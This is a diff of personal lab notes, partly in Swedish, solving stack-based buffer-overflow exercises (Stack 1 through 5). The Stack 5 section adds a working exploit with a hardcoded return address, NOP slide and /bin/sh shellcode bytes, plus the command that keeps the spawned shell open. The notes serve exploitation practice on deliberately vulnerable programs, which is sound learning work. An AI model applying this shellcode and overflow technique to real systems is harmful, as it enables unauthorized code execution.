@@ -40,20 +40,28 @@ define hook-stop
 >end
 
 
-**** Stack 1 ****
+******************************************
+**               Stack 1                **
+******************************************
 echo $(python -c "print('A'*64 + 'dcba')") | xargs ./stack1
 
-**** Stack 2 ****
+******************************************
+**               Stack 2                **
+******************************************
 export GREENIE=$(python -c "print('A'*64 + '\n\r\n\r')")
 
-**** Stack 3 ****
+******************************************
+**               Stack 3                **
+******************************************
 gdb ./stack3            (objdump -d ./stack3)
 disassemble main
 disassemble win
 win() startaddr: 0x08048424 
 echo $(python -c "print('A'*64 + '$' + chr(132) + chr(4) + chr(8))") | ./stack3
 
-**** Stack 4 ****
+******************************************
+**               Stack 4                **
+******************************************
 chsh -s /bin/bash      -> Ändra shell till bash så gdb kör med det
 bash
 logout                   -> Måste logga ut för att env har SHELL som bash
@@ -83,7 +91,9 @@ eip = struct.pack("1", 0x080483f4)
 payload = padding + ebp + eip
 print(payload)
 
-**** Stack 5 ****
+******************************************
+**               Stack 5                **
+******************************************
 Verkar som att man alltid vill skriva över "saved $eip" i buffer overflows.
 Kolla dessa vid varje segfault för att se vilken instruktion som failade, samt vilken instruktion som failade
 för ibland skrivs inte $eip över om "ret" redan ser att adressen är för stor eller ngt, så man får inte se 
@@ -97,10 +107,52 @@ att instruktionerna i shellcode börjar skriva över sig själva med push/pop. A
 eip med en nopslide "padding" innan, eller nopslide + shellcode + padding + epi. Alltså payload bör vara:
 payload = padding + EIP + nopslide ("\x90"*64) + shellcode
 där EIP = start_addr (Adress där buffer börjar på stack) + len(padding) + sizeof(EIP)(troligen 4 bytes) + 10(ett bar bytes för att garantera att vi hamnar i nopslide) 
+----------------
+Start: 
+EIP är på adress: 0xbffff7dc
+Så lär kunna sätta EIP = 0xbffff7dc + 10
+för att dra igång mitt script
 
-#/bin/python 
-padding = "A" * (64 + 4*2) //payload här sen peka eip på detta? Vi kan ju kolla vilken adress det kommer hamna på
-ebp = "AAAA"
-eip = struct.pack("1", 0x080483f4)
-payload = padding + ebp + eip
+Fick SIGTRAP av följande: (Glöm inte att köra utan break)
+#!/usr/bin/env python
+import struct
+##eip_address = struct.pack("L", 0xbffff7dc)
+start_address = int("0xbffff7dc", 16)
+padding = "A" * (64 + 4*3)
+EIP = struct.pack("L", start_address + 4 + 16)     ## Add 4 to end up on address after EIP, then add 10 to end up inside nopslide
+shellcode = "\xcc"
+nopslide = "\x90" * 64
+payload = padding + str(EIP) + nopslide + shellcode
 print(payload)
+
+Bara att lägga till en fin shellcode :D
+----------------------------------------- 
+UPDATE:
+Efter att ha lekt runt med olika shellcodes hittade jag denna: http://shell-storm.org/shellcode/files/shellcode-585.php
+Men programmet fungerade ändå inte, även fast jag får SIGTRAP i gdb. Shellcode exekverades i gdb, och öppnade nytt shell,
+men man får inte mata in något eftersom gdb inte kan debugga den processen. Därför måste man sedan testa shellkoden utanför.
+Nästa problem var att jag inte träffade shellkoden ordentligt utanför gdb, vilket fixades genom att ändra storleken på nopslide (256),
+samt addera typ 100st adresser efter EIP för att garantera att jag hamnar innanför nopslide. Det ärt för att utanför gdb läggs massa skit
+till på stacken, som tex miljövariablar osv. Därför behövs en större nopslide osv.  
+Så man måste typ testa utanför gdb för att få full access. 
+
+Den slutgiltiga exploiten blev därmed: 
+----------------------------------------
+#!/usr/bin/env python
+import struct
+##eip_address = struct.pack("L", 0xbffff7dc)
+start_address = int("0xbffff7dc", 16)
+padding = "A" * (64 + 4*3)
+EIP = struct.pack("L", start_address + 4 + 100)     ## Add 4 to end up on address after EIP, then add 10 to end up inside nopslide
+shellcode = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+nopslide = "\x90" * 256
+payload = padding + EIP + nopslide + shellcode
+print(payload)
+----------------------------------------
+Där programmet ska exekveras såhär för att behålla access till det spawnade shellet: 
+(python ./stack5.py; cat) | ./stack5         <---- Där cat gör att vi kan fortsätta mata in saker i shell :D
+
+******************************************
+**               Stack 6                **
+******************************************
+TODO :)
